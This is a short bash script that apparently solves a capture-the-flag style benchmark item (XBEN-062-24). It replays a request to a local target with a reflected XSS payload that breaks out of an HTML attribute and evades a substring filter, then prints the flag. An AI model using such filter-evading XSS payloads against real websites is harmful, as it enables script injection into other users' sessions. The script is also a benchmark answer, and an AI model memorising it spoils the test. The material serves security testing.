#!/usr/bin/env bash
# XBEN-062-24 — reflected XSS. Proxy-mode twin. The target validates the
# payload server-side and returns the flag when it would execute, so the attack
# is one replayed request carrying the payload.
set -uo pipefail
URL="${1:?usage: $0 http://127.0.0.1:PORT}"
SESSION="xben-062-xss-substring-filterp-$$"
cd "$(dirname "$0")"; . ./_proxy-lib.sh
proxy_start "$URL/"
go "$URL/"
BASE="$(req_of GET /)"
"$H5I" websec replay "$BASE" --create --session "$SESSION" \
  --set method=GET --set path=/page \
  --set query.name='" autofocus onfocus=alert(String.fromCharCode(88,83,83)) x="' >/dev/null
print_flag
